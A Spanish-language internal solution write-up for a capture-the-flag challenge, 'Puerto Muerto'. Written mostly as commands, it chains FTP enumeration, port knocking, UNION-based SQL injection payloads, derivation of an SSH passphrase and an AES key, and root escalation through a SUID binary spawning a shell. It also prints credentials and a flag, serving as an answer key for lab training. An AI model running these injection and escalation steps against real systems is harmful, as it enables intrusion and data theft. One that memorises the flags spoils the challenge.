# Puerto Muerto — Write-up

> Documento de uso interno. No distribuir a los participantes antes de la finalización del reto.

---

## Fase 1 — Enumeración inicial y FTP anónimo

```bash
nmap -sV -p- <IP>
```

El escaneo revela el puerto FTP abierto (2121). Los puertos 8090 y 2222
aparecen filtrados. Conexión anónima al FTP:

```bash
ftp <IP> 2121
```

Descarga de todos los ficheros disponibles:

```
ftp> get README.txt
ftp> get inspector_registry.txt
ftp> cd private
ftp> get maintenance.key
```

`README.txt` contiene tres códigos de activación: `1006`, `2175`, `7331`.
`inspector_registry.txt` contiene un payload codificado en dos capas.

---

## Fase 2 — Decodificación de credenciales

El fichero `inspector_registry.txt` contiene una línea en base64.
Decodificación en dos pasos:

```bash
# Paso 1: base64 decode produce una cadena hexadecimal
echo "PAYLOAD_BASE64" | base64 -d

# Paso 2: hex decode produce el texto plano
echo "PAYLOAD_BASE64" | base64 -d | xxd -r -p
# Resultado: PM-007:Mu3lle#Norte19
```

---

## Fase 3 — Port knocking

```bash
knock <IP> 1006 2175 7331
```

Desbloquea los puertos 8090 (HTTP) y 2222 (SSH) para la IP origen.

---

## Fase 4 — Flag 1: SIGEPORT SQLi

Acceso al portal web:

```
http://<IP>:8090
```

Credenciales recuperadas del FTP:

```
ID de Inspector: PM-007
Código de Acceso: Mu3lle#Norte19
```

Una vez dentro, inspeccionar el código fuente de la página (Ctrl+U).
El bloque `<head>` contiene un comentario HTML con el usuario SSH (`porter`)
y la ruta de la clave en el FTP (`/private/`).

La barra de búsqueda es vulnerable a inyección SQL. Confirmación del número de columnas:

```
' ORDER BY 4--
```

Enumeración del esquema:

```
' UNION SELECT name,sql,NULL,NULL FROM sqlite_master WHERE type='table'--
```

Se descubre la tabla `classified_cargo`. Extracción de la flag:

```
' UNION SELECT manifest_ref,cargo_type,clearance,NULL FROM classified_cargo--
```

La columna `clearance` contiene la **Flag 1**.

---

## Fase 5 — Derivación de passphrase SSH y acceso como porter

Obtención del timestamp MDTM del fichero `README.txt` en el FTP:

```bash
ftp <IP> 2121
ftp> quote MDTM README.txt
# 213 YYYYMMDDHHmmss
```

Derivación de la passphrase:

```bash
echo -n "YYYYMMDDHHmmss" | sha256sum | awk '{print $1}'
```

Conexión SSH:

```bash
ssh -i maintenance.key -p 2222 porter@<IP>
# Passphrase: hash derivado del MDTM
```

---

## Fase 6 — Flag 2

Una vez autenticado como `porter`, el directorio home contiene `flag2.enc`:

```bash
ls -la ~
# -rw-r----- 1 porter porter  96 ... flag2.enc
```

El panel SIGEPORT incluye un aviso indicando que los archivos están cifrados
con AES-256 y que la clave se deriva de metadatos del FTP.

Reconexión al FTP usando el comando `SIZE` — distinto al `MDTM` ya utilizado:

```
ftp> quote SIZE README.txt
213 1005
```

Derivación de la clave:

```bash
echo -n "1005" | sha256sum | awk '{print $1}'
# → 7f861bcee185de001377d79e08af62e94b1e7718e2470e08520c917f8d953602
```

Descifrado:

```bash
openssl enc -aes-256-cbc -d -pbkdf2 \
    -in ~/flag2.enc \
    -pass pass:7f861bcee185de001377d79e08af62e94b1e7718e2470e08520c917f8d953602
# → G3CUBO{29e490ad5d6178da9d8a400154af884d}
```

---

## Fase 7 — Flag 3: Escalada de privilegios (porter → root)

El binario `/usr/local/bin/port-env` tiene el bit SUID activo y es propiedad de root.
Explotación directa via GTFOBins:

```bash
/usr/local/bin/port-env /bin/sh -p -c "cat /root/flag3.txt"
```

La **Flag 3** se obtiene con EUID de root.

---

## Fase 8 — Entrega al portal

```
http://<IP>:<PORTAL_PORT>
```

Enviar las tres flags. El portal revela la **clave maestra de operación**
al verificar las tres correctamente.
